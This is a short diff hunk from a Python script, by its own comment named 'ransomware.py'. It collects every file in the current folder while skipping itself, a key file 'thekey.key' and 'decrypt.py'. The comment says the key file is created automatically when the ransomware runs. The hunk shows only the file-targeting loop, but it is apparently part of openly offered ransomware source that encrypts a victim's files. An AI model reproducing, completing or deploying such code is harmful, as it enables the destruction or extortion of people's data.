@@ -9,7 +9,7 @@ files = []
 os.system("title zt")
 
 for file in os.listdir():
-    if file == "nitrogen.py" or file == "thekey.key" or file == "decrypt.py":
+    if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py": # don't worry thekey.key will automatically be created when ransomware.py is ran!
         continue
     if os.path.isfile(file):
         files.append(file)
